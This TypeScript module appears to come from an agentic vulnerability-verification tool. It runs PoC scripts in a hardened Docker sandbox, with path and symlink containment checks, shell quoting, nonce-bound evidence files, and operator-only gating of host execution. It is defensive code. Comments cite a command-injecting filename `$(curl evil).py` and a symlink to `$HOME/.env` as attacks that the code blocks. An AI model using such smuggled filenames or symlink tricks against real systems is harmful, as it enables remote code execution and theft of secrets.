import { spawnSync } from "node:child_process";
import { createHash, randomBytes } from "node:crypto";
import {
  copyFileSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  realpathSync,
  rmSync,
  statSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { basename, extname, isAbsolute, join, relative, resolve } from "node:path";

import { evidenceNonceMatches, type PoCEvidence, parsePoCEvidence } from "./evidence.ts";
import { ensureSafeStateDirectory, writeSafeFileExclusive } from "./safe-state.ts";
import { findWorkspaceRoot } from "./scratchpad.ts";

export type PocRun = {
  path: string;
  exitCode: number;
  output: string;
  ranAt: string;
  sandbox: boolean;
  /**
   * True iff the script actually ran to completion. False when the process
   * could not start (spawn error), was killed by a signal, or timed out —
   * a crash is NOT a verdict, and callers must not treat it as one.
   */
  completed: boolean;
  /**
   * Sanitized but UNTRUNCATED output (capped only by the spawn maxBuffer).
   * Marker presence/absence checks MUST run on this, never on `output`,
   * which is sliced for display — a cheating script can print its marker
   * past the 4000-char display window. Never persisted to the ledger.
   */
  rawOutput?: string;
  /** True when `output` was truncated for display (rawOutput has more). */
  truncated?: boolean;
  /** True iff child output capture was complete. False on maxBuffer/timeouts/spawn failures. */
  outputComplete?: boolean;
  /** Harness mode used for this run. */
  mode?: string;
  /** Harness target used for this run. */
  target?: string;
  /** True when the run never started because of harness infrastructure
   * failure (e.g. sandbox image pull failed) — set only by the runner,
   * never derived from PoC-controlled output text. */
  infraError?: boolean;
  /** Validated evidence.json written by the PoC to $PI_POC_EVIDENCE_DIR. */
  evidence?: PoCEvidence;
  /** SHA-256 of the evidence.json file (reproduction artifact). */
  evidenceSha256?: string;
  /** Absolute path of the PRESERVED copy of evidence.json (moved into the
   * durable .pi/poc-evidence/ dir before the temp workspace is cleaned up) —
   * lets the ledger's reproduction item stay artifact-backed and re-verifiable. */
  evidencePath?: string;
  /** Evidence contract failure (missing/invalid/nonce mismatch) — blocks the gate. */
  evidenceError?: string;
  /** The per-run nonce the evidence must be bound to (harness-generated). */
  nonce?: string;
};

/**
 * Run-mode options for `runPoc`. Host execution is NEVER selectable by the
 * agent alone: `local: true` only takes effect when the OPERATOR has set
 * `PI_POC_ALLOW_LOCAL=1` (host is a fallback when Docker is unavailable;
 * `PI_POC_FORCE_LOCAL=1` + ALLOW skips Docker on purpose). The default is a
 * Docker sandbox; `network: "host"` gives the sandbox host networking while
 * keeping the read-only FS / dropped caps / unprivileged user / resource limits.
 */
export type PocRunOptions = {
  /** Docker sandbox networking: "none" (default) or "host" (live/network-dependent findings). */
  network?: "none" | "host";
  /** True to run on the host (no Docker). Requires operator opt-in PI_POC_ALLOW_LOCAL=1. */
  local?: boolean;
  /**
   * Extra environment variables merged into the run. The harness sets
   * `PI_POC_MODE` ("poc" | "control" | "disconfirmation") and `PI_POC_TARGET`
   * (the case target) so PoCs can be written once and parameterized per run.
   */
  env?: Record<string, string>;
};

/** Operator-only opt-in for host execution (never agent-supplied). */
const LOCAL_EXEC_ENV = "PI_POC_ALLOW_LOCAL";
const EVIDENCE_MAX_BYTES = 256 * 1024;

export type PocLanguage = {
  /** Docker image used when running inside the sandbox. */
  image: string;
  /** Shell command to run an interpreted PoC. {{file}} is replaced with the source path. */
  run: string;
  /** Files that, when present in the project root, identify this project type. */
  projectMarkers?: string[];
};

/** Built-in interpreted languages. Compiled languages are unsupported on purpose. */
const BUILTIN_LANGUAGES: Record<string, PocLanguage> = {
  python: {
    image: "python:3.12-slim",
    run: "python3 {{file}}",
    projectMarkers: ["requirements.txt", "pyproject.toml", "setup.py", "Pipfile"],
  },
  node: {
    image: "node:22-slim",
    run: "node {{file}}",
    projectMarkers: ["package.json"],
  },
  shell: {
    image: "alpine",
    run: "sh {{file}}",
  },
};

/** Extension to language key. Unknown extensions need a shebang or PI_POC_DEFAULT_LANGUAGE. */
const EXTENSION_MAP: Record<string, string> = {
  ".py": "python",
  ".js": "node",
  ".mjs": "node",
  ".cjs": "node",
  ".ts": "node",
  ".sh": "shell",
  ".bash": "shell",
  ".zsh": "shell",
};

const OUTPUT_MAX_CHARS = 4000;
const TIMEOUT_MS = 30_000;
/** Completion sentinel echoed after the PoC command inside the sandbox shell. */
function makeSentinel(): string {
  return `__PI_POC_DONE_${randomBytes(16).toString("hex")}__`;
}
/** Per-run random nonce the PoC must echo in evidence.json (binds evidence to its run). */
function makeNonce(): string {
  return `poc_${randomBytes(24).toString("hex")}`;
}
/** First-use image downloads are slow — pull outside the run timeout. */
const PULL_TIMEOUT_MS = 300_000;
const MAX_BUFFER = 8 * 1024 * 1024;

function getProjectRoot(): string {
  return findWorkspaceRoot(["PI_POC_ROOT"], [".git"]);
}

function detectProjectType(): string | undefined {
  const root = getProjectRoot();
  for (const [key, lang] of Object.entries(BUILTIN_LANGUAGES)) {
    for (const marker of lang.projectMarkers ?? []) {
      if (existsSync(join(root, marker))) return key;
    }
  }
  return undefined;
}

function parseShebang(pocPath: string): string | undefined {
  try {
    const head = readFileSync(pocPath, "utf8").split(/\r?\n/)[0];
    if (!head.startsWith("#!")) return undefined;
    const trimmed = head.slice(2).trim();
    // "#!/usr/bin/env python3" -> "python3"
    // "#!/usr/bin/python3" -> "python3"
    const parts = trimmed.split(/\s+/);
    if (parts[0] === "/usr/bin/env" || parts[0] === "/bin/env") {
      return parts[1];
    }
    return basename(parts[0]);
  } catch {
    return undefined;
  }
}

function interpreterToLanguage(interpreter: string): string | undefined {
  const bin = basename(interpreter).toLowerCase();
  for (const [key, lang] of Object.entries(BUILTIN_LANGUAGES)) {
    if (lang.run.split(" ")[0].toLowerCase() === bin) return key;
  }
  return undefined;
}

function resolveLanguage(pocPath: string): { key: string; language: PocLanguage } {
  const ext = extname(pocPath).toLowerCase();
  const extKey = EXTENSION_MAP[ext];

  // 1. Shebang overrides everything.
  const shebang = parseShebang(pocPath);
  if (shebang) {
    const shebangKey = interpreterToLanguage(shebang);
    if (shebangKey) return { key: shebangKey, language: BUILTIN_LANGUAGES[shebangKey] };
  }

  // 2. Extension-based language (prefer the PoC file itself over ambient project markers).
  // A .py PoC in a Node monorepo must still run under python, not node.
  if (extKey && BUILTIN_LANGUAGES[extKey]) {
    return { key: extKey, language: BUILTIN_LANGUAGES[extKey] };
  }

  // 3. Project type detection only when the extension is unknown/unmapped.
  const projectType = detectProjectType();
  if (projectType && BUILTIN_LANGUAGES[projectType]) {
    return { key: projectType, language: BUILTIN_LANGUAGES[projectType] };
  }

  // 4. Unknown extension: allow env override specifying a single language key.
  const envDefault = process.env.PI_POC_DEFAULT_LANGUAGE?.trim();
  if (envDefault && BUILTIN_LANGUAGES[envDefault]) {
    return { key: envDefault, language: BUILTIN_LANGUAGES[envDefault] };
  }

  const supported = Object.keys(BUILTIN_LANGUAGES).sort().join(", ");
  throw new Error(
    `Cannot determine PoC language for "${pocPath}". ` +
      `Detected extension: "${ext || "none"}". ` +
      `Supported languages: ${supported}. ` +
      `Add a shebang, use a known extension, or set PI_POC_DEFAULT_LANGUAGE.`,
  );
}

function validatePocPath(pocPath: string): string {
  if (!pocPath || typeof pocPath !== "string") {
    throw new Error("PoC path must be a non-empty string");
  }

  if (!isAbsolute(pocPath)) {
    throw new Error(`PoC path must be absolute: ${pocPath}`);
  }

  const normalized = resolve(pocPath);
  if (normalized.includes("\0")) {
    throw new Error("PoC path contains null bytes");
  }

  const root = getProjectRoot();
  // Operator escape hatch: PI_POC_ALLOW_ABSOLUTE=1 disables BOTH the lexical
  // and the realpath containment checks (agent cannot set it).
  const allowAbsolute = process.env.PI_POC_ALLOW_ABSOLUTE === "1";
  // Use path.relative so prefix-sibling escapes like /tmp/proj vs /tmp/proj-evil are rejected.
  // startsWith(`${root}/`) would accept /tmp/proj-evil when root is /tmp/proj.
  const rel = relative(root, normalized);
  const outsideWorkspace = rel === "" ? false : rel.startsWith("..") || isAbsolute(rel);
  if (outsideWorkspace && !allowAbsolute) {
    throw new Error(
      `PoC path must be under the project workspace (${root}). ` +
        `Set PI_POC_ALLOW_ABSOLUTE=1 to allow arbitrary absolute paths.`,
    );
  }

  if (!existsSync(normalized)) {
    throw new Error(`PoC not found on disk: ${pocPath}`);
  }

  // Symlink containment: the lexical checks above are defeated by a
  // workspace file that is a symlink to a host path (e.g. $HOME/.env) —
  // existsSync/copyFileSync/readFileSync all dereference. Resolve the real
  // path and re-run the containment check on it, then require a regular
  // file (FIFOs/devices/sockets are rejected).
  let real: string;
  try {
    real = realpathSync(normalized);
  } catch {
    throw new Error(`PoC path cannot be resolved: ${pocPath}`);
  }
  if (!allowAbsolute) {
    const realRel = relative(root, real);
    const realOutside = realRel === "" ? false : realRel.startsWith("..") || isAbsolute(realRel);
    if (realOutside) {
      throw new Error(
        `PoC path resolves outside the project workspace (${real}). ` +
          `Symlinked files outside ${root} are rejected.`,
      );
    }
  }
  const realStat = statSync(real);
  if (!realStat.isFile()) {
    throw new Error(`PoC path must resolve to a regular file (got ${pocPath})`);
  }

  return normalized;
}

/**
 * Strip control chars / ANSI escapes from PoC output. Does NOT slice —
 * truncation is display-only and must never hide content from marker checks.
 */
function sanitizeOutput(output: string): string {
  // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional
  const nulls = /\x00/g;
  // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional
  const ansi = /\x1b\[[0-9;]*[a-zA-Z]/g;
  // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional
  const ctrl = /[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f]+/g;

  return output
    .replace(/\r\n/g, "\n")
    .replace(/\r/g, "\n")
    .replace(nulls, "")
    .replace(ansi, "")
    .replace(ctrl, "");
}

/** Split sanitized output into the raw (whole) and display (sliced) halves. */
function splitOutput(raw: string): { rawOutput: string; output: string; truncated: boolean } {
  const truncated = raw.length > OUTPUT_MAX_CHARS;
  return { rawOutput: raw, output: raw.slice(0, OUTPUT_MAX_CHARS), truncated };
}

/**
 * Read + validate the PoC's evidence.json from the harness-owned evidence
 * dir. Missing, malformed, or nonce-mismatched evidence is a contract
 * failure, not a verdict — surfaced as evidenceError on the run.
 */
function readEvidence(
  evidenceDir: string,
  nonce: string,
): {
  evidence?: PoCEvidence;
  evidenceSha256?: string;
  evidenceBytes?: Buffer;
  evidenceError?: string;
} {
  const p = join(evidenceDir, "evidence.json");
  if (!existsSync(p)) {
    return {
      evidenceError: `evidence.json missing in ${evidenceDir} — the PoC must write it to $PI_POC_EVIDENCE_DIR ({"nonce", "claim", "verify", "observations"})`,
    };
  }
  const file = lstatSync(p);
  if (file.isSymbolicLink() || !file.isFile()) {
    return { evidenceError: "evidence.json must be a regular, non-symlink file" };
  }
  if (file.size > EVIDENCE_MAX_BYTES) {
    return {
      evidenceError: `evidence.json too large (${file.size} bytes; max ${EVIDENCE_MAX_BYTES})`,
    };
  }
  let bytes: Buffer;
  let raw: unknown;
  try {
    bytes = readFileSync(p);
    if (bytes.byteLength > EVIDENCE_MAX_BYTES) {
      return {
        evidenceError: `evidence.json too large (${bytes.byteLength} bytes; max ${EVIDENCE_MAX_BYTES})`,
      };
    }
    raw = JSON.parse(bytes.toString("utf8"));
  } catch (e) {
    return { evidenceError: `evidence.json unparseable: ${(e as Error).message}` };
  }
  const parsed = parsePoCEvidence(raw);
  if (!parsed.ok) return { evidenceError: parsed.error };
  if (!evidenceNonceMatches(parsed.evidence, nonce)) {
    return {
      evidenceError:
        "evidence.json nonce mismatch — the file was not written by this run (copy-pasted evidence fails here)",
    };
  }
  return {
    evidence: parsed.evidence,
    evidenceSha256: createHash("sha256").update(bytes).digest("hex"),
    evidenceBytes: bytes,
  };
}

function runProvenance(env?: Record<string, string>): Pick<PocRun, "mode" | "target"> {
  return { mode: env?.PI_POC_MODE, target: env?.PI_POC_TARGET };
}

/**
 * Copy the run's evidence.json into a durable harness-owned dir BEFORE the
 * temp workspace is deleted. The ledger's reproduction item stores the SHA-256
 * of this exact file, so the file must survive the run — otherwise the
 * "artifact-backed" evidence item hashes a file that no longer exists.
 * Returns the preserved path, or undefined when the file is missing.
 */
function preserveEvidence(bytes: Buffer, nonce: string): string | undefined {
  try {
    const projectRoot = getProjectRoot();
    const durableDir = ensureSafeStateDirectory(projectRoot, [".pi", "poc-evidence"]);
    const dest = join(durableDir, `${nonce}.evidence.json`);
    writeSafeFileExclusive(dest, bytes);
    return dest;
  } catch {
    // Preservation is part of the gate: readAndPreserveEvidence surfaces this
    // as evidenceError, so confirmation cannot depend on an ephemeral file.
    return undefined;
  }
}

function readAndPreserveEvidence(
  evidenceDir: string,
  nonce: string,
): {
  evidence?: PoCEvidence;
  evidenceSha256?: string;
  evidencePath?: string;
  evidenceError?: string;
} {
  const read = readEvidence(evidenceDir, nonce);
  if (!read.evidence || !read.evidenceSha256 || !read.evidenceBytes) {
    return { evidenceError: read.evidenceError ?? "evidence.json validation failed" };
  }
  const evidencePath = preserveEvidence(read.evidenceBytes, nonce);
  if (!evidencePath) {
    return {
      evidenceError:
        "evidence.json was valid but could not be preserved in the durable evidence store",
    };
  }
  return {
    evidence: read.evidence,
    evidenceSha256: read.evidenceSha256,
    evidencePath,
  };
}

function outputWasComplete(result: { error?: Error; signal: string | null }): boolean {
  return !result.error && result.signal === null;
}

/** Reject control characters in harness-supplied PoC env values. */
function sanitizePocEnv(env: Record<string, string>): Record<string, string> {
  const out: Record<string, string> = {};
  for (const [key, value] of Object.entries(env)) {
    if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(key)) {
      throw new Error(`Invalid PoC env key: ${key}`);
    }
    // biome-ignore lint/suspicious/noControlCharactersInRegex: intentional
    if (/[\x00-\x1f\x7f]/.test(value)) {
      throw new Error(`PoC env value for ${key} contains control characters`);
    }
    out[key] = value;
  }
  return out;
}

function buildDockerArgs(
  image: string,
  command: string,
  workspaceDir: string,
  containerName: string,
  network: "none" | "host",
  env?: Record<string, string>,
): string[] {
  const envArgs: string[] = [];
  for (const [key, value] of Object.entries(sanitizePocEnv(env ?? {}))) {
    // Values are single tokens from the harness (PI_POC_MODE / PI_POC_TARGET);
    // pass them as separate -e args so no shell quoting is involved.
    envArgs.push("-e", `${key}=${value}`);
  }
  return [
    "run",
    "--rm",
    "--name",
    containerName,
    "--network",
    network,
    ...envArgs,
    "--read-only",
    "--cap-drop",
    "ALL",
    "--security-opt",
    "no-new-privileges",
    "--user",
    "1000:1000",
    "--memory",
    "256m",
    "--pids-limit",
    "128",
    "--cpus",
    "1.0",
    "-v",
    `${workspaceDir}:/workspace:rw`,
    image,
    "sh",
    "-c",
    command,
  ];
}

/** Escape a string for a POSIX single-quoted shell context. */
function shq(s: string): string {
  return `'${s.replace(/'/g, "'\\''")}'`;
}

function renderCommand(template: string, pocPath: string, inSandbox: boolean): string {
  // In the sandbox the template runs under `sh -c`, and the PoC basename is
  // agent-controlled — single-quote the substitution so a hostile filename
  // (e.g. `$(curl evil).py`) cannot inject shell into the container entrypoint.
  // Local mode uses no shell (args passed verbatim), so quoting stays off there.
  const targetPath = inSandbox ? shq(`/workspace/${basename(pocPath)}`) : pocPath;
  return template.replace(/{{file}}/g, targetPath);
}

/**
 * Translate a spawnSync result into a robust exit code.
 *
 * `spawnSync` returns `status: null` AND `signal: null` when it cannot even start
 * the child (e.g. the binary is missing → ENOENT, or the docker daemon is
 * unavailable). The previous `result.status ?? (result.signal ? 1 : 0)` then
 * collapsed to `0`, making a never-executed PoC look successful — which let
 * PromoteFinding promote an investigating case to CONFIRMED without the PoC
 * ever running. We fail closed: a spawn error or a missing status/signal is
 * always a non-zero exit.
 */
function spawnExitCode(result: {
  status: number | null;
  signal: string | null;
  error?: Error;
}): number {
  if (result.error) return 127;
  if (result.status !== null) return result.status;
  return 1;
}

/**
 * Pull the sandbox image (if absent) BEFORE the timed run. Otherwise a
 * first-use `docker run` spends the whole 30s run timeout downloading the
 * image and the PoC fails spuriously.
 */
function ensureImage(image: string): void {
  const inspect = spawnSync("docker", ["image", "inspect", image], {
    encoding: "utf8",
    timeout: TIMEOUT_MS,
  });
  if (!inspect.error && inspect.status === 0) return;
  const pull = spawnSync("docker", ["pull", image], {
    encoding: "utf8",
    timeout: PULL_TIMEOUT_MS,
    maxBuffer: MAX_BUFFER,
  });
  if (pull.error || pull.status !== 0) {
    const detail = pull.error?.message ?? (pull.stderr ?? "").slice(0, 300);
    throw new Error(`Failed to pull PoC sandbox image "${image}": ${detail}`);
  }
}

function runSandboxed(
  pocPath: string,
  language: PocLanguage,
  network: "none" | "host" = "none",
  env?: Record<string, string>,
): PocRun {
  const ranAt = new Date().toISOString();
  const sourceName = basename(pocPath);
  const workspaceDir = mkdtempSync(resolve(tmpdir(), "poc-runner-"));
  // Named container so a timed-out / killed client can still be cleaned up —
  // `--rm` alone leaks the container when the CLI dies before the child exits.
  const containerName = `poc-runner-${process.pid}-${randomBytes(8).toString("hex")}`;
  // Evidence contract: harness-owned dir + per-run nonce. The PoC writes
  // evidence.json into $PI_POC_EVIDENCE_DIR (/workspace/evidence inside the
  // container); the nonce binds the file to this run.
  const nonce = makeNonce();
  const evidenceDir = join(workspaceDir, "evidence");
  mkdirSync(evidenceDir, { recursive: true });
  const runEnv = {
    ...env,
    PI_POC_EVIDENCE_DIR: "/workspace/evidence",
    PI_POC_NONCE: nonce,
  };

  try {
    // Fail closed as a non-zero run (not a throw) when docker/images are
    // unavailable — callers treat infra failure as "PoC did not verify".
    try {
      ensureImage(language.image);
    } catch (e) {
      return {
        path: pocPath,
        exitCode: 127,
        output: `[sandbox image error] ${(e as Error).message}`,
        ranAt,
        sandbox: true,
        completed: false,
        infraError: true,
        outputComplete: false,
        ...runProvenance(env),
      };
    }
    copyFileSync(pocPath, `${workspaceDir}/${sourceName}`);

    const command = renderCommand(language.run, pocPath, true);

    // Completion sentinel: wrap the command so the shell echoes a unique token
    // ONLY when the PoC exited normally (rc < 128). A child killed by a signal
    // (segfault, OOM under the sandbox limits) yields rc = 128+N — the sentinel
    // is suppressed, so `completed` means "the script actually ran to
    // completion", not merely "the container exited". Callers treat a missing
    // sentinel as "not a verdict".
    const sentinel = makeSentinel();
    const wrapped = `${command}; rc=$?; if [ "$rc" -lt 128 ]; then echo '${sentinel}'; fi; exit $rc`;

    const result = spawnSync(
      "docker",
      buildDockerArgs(language.image, wrapped, workspaceDir, containerName, network, runEnv),
      {
        encoding: "utf8",
        timeout: TIMEOUT_MS,
        maxBuffer: MAX_BUFFER,
      },
    );

    const spawnErr = result.error ? `\n[spawn error] ${result.error.message}` : "";
    const raw = (result.stdout ?? "") + (result.stderr ?? "") + spawnErr;
    const completed = raw.includes(sentinel);
    const { rawOutput, output, truncated } = splitOutput(sanitizeOutput(raw.replace(sentinel, "")));
    const evidence = readAndPreserveEvidence(evidenceDir, nonce);
    return {
      path: pocPath,
      exitCode: spawnExitCode(result),
      output,
      rawOutput,
      truncated,
      ranAt,
      sandbox: true,
      completed,
      outputComplete: outputWasComplete(result),
      nonce,
      ...evidence,
      ...runProvenance(env),
    };
  } finally {
    // Best-effort: remove any container still running after a timeout/kill.
    try {
      spawnSync("docker", ["rm", "-f", containerName], { timeout: 10_000 });
    } catch {
      // Ignore.
    }
    try {
      rmSync(workspaceDir, { recursive: true, force: true });
    } catch {
      // Best-effort cleanup.
    }
  }
}

function runLocal(pocPath: string, language: PocLanguage, env?: Record<string, string>): PocRun {
  const ranAt = new Date().toISOString();
  // Evidence contract: harness-owned temp dir + per-run nonce, same as sandboxed.
  const nonce = makeNonce();
  const evidenceDir = mkdtempSync(join(tmpdir(), "poc-evidence-"));
  const runEnv = {
    ...env,
    PI_POC_EVIDENCE_DIR: evidenceDir,
    PI_POC_NONCE: nonce,
  };

  try {
    // The run template is `<interpreter> [flags...] {{file}}`. Split the static
    // template on whitespace FIRST (builtins only, not user input), then render
    // placeholders within each token. Passing the tokens to spawnSync with NO
    // shell keeps a space-containing PoC path as one arg and keeps extra flags
    // (e.g. `node --experimental-vm-modules {{file}}`) as separate args.
    // Splitting after rendering would re-split a space-containing path.
    const tokens = language.run.trim().split(/\s+/).filter(Boolean);
    const interpreter = tokens.shift() ?? language.run.trim();
    const args = tokens.map((tok) => renderCommand(tok, pocPath, false));

    const result = spawnSync(interpreter, args, {
      encoding: "utf8",
      timeout: TIMEOUT_MS,
      maxBuffer: MAX_BUFFER,
      // Host runs get the harness env contract merged over the operator env;
      // the spawn env is explicitly provided so PI_POC_MODE / PI_POC_TARGET
      // reach the script without leaking through a shell. Same control-char
      // rejection as the sandboxed path.
      env: { ...process.env, ...sanitizePocEnv(runEnv) },
    });

    // Local runs stay shell-free (space-containing paths stay single args), so
    // there is no sentinel echo: "completed" is derived from the spawn result.
    // A spawn error (interpreter missing) or a signal kill (timeout, SIGKILL)
    // means the script never ran to completion — fail closed on those.
    const spawnErr = result.error ? `\n[spawn error] ${result.error.message}` : "";
    const completed = !result.error && result.signal === null;
    const { rawOutput, output, truncated } = splitOutput(
      sanitizeOutput((result.stdout ?? "") + (result.stderr ?? "") + spawnErr),
    );
    const evidence = readAndPreserveEvidence(evidenceDir, nonce);
    return {
      path: pocPath,
      exitCode: spawnExitCode(result),
      output,
      rawOutput,
      truncated,
      ranAt,
      sandbox: false,
      completed,
      outputComplete: outputWasComplete(result),
      nonce,
      ...evidence,
      ...runProvenance(env),
    };
  } finally {
    try {
      rmSync(evidenceDir, { recursive: true, force: true });
    } catch {
      // Best-effort cleanup.
    }
  }
}

/**
 * Run a PoC script in an adaptive, language-aware sandbox or locally.
 *
 * Language detection (in order):
 * 1. Shebang line in the PoC file.
 * 2. File extension (a .py PoC in a Node repo still runs under python).
 * 3. PI_POC_DEFAULT_LANGUAGE environment variable (a built-in language key).
 *
 * Security:
 * - PoC paths must be absolute and under the project workspace by default.
 * - Docker sandbox runs with read-only root FS, dropped caps, no new
 *   privileges, an unprivileged user, and resource limits. Networking is
 *   `none` by default; `network: "host"` adds host networking for live
 *   findings WITHOUT giving up the FS/cap/user isolation.
 * - Host execution (local: true) is NOT agent-selectable: the default is a
 *   host-network Docker sandbox. Bare host requires the operator's
 *   `PI_POC_ALLOW_LOCAL=1` and is used only when Docker is unavailable
 *   (or when `PI_POC_FORCE_LOCAL=1` is also set). Without ALLOW the run
 *   fails closed if Docker cannot start.
 */
export function runPoc(pocPath: string, options?: PocRunOptions): PocRun {
  const normalized = validatePocPath(pocPath);
  const { language } = resolveLanguage(normalized);

  const opts: PocRunOptions = options ?? {};

  // Host execution is gated by the OPERATOR, never by an agent-supplied flag.
  // `local: true` means "network access needed":
  //   1. Prefer a host-network Docker sandbox (isolation retained).
  //   2. Fall back to bare host ONLY when Docker/image is unavailable AND the
  //      operator set PI_POC_ALLOW_LOCAL=1.
  //   3. PI_POC_FORCE_LOCAL=1 + ALLOW lets the operator (or test harness)
  //      skip Docker and run on the host deliberately — still never agent-only.
  if (opts.local === true) {
    const allowLocal = process.env[LOCAL_EXEC_ENV] === "1";
    const forceLocal = process.env.PI_POC_FORCE_LOCAL === "1";
    if (forceLocal && allowLocal) {
      return runLocal(normalized, language, opts.env);
    }
    const sandboxed = runSandboxed(normalized, language, "host", opts.env);
    if (!sandboxed.infraError) {
      return sandboxed;
    }
    if (allowLocal) {
      return runLocal(normalized, language, opts.env);
    }
    return {
      ...sandboxed,
      output:
        sandboxed.output +
        `\n[host execution blocked] local:true cannot run on the host without the operator's ` +
        `${LOCAL_EXEC_ENV}=1 — an agent-supplied local flag alone cannot enable host execution. ` +
        "Ask the operator to opt in, or use the default (isolated) sandbox if the PoC does not need network.",
    };
  }

  return runSandboxed(normalized, language, opts.network ?? "none", opts.env);
}
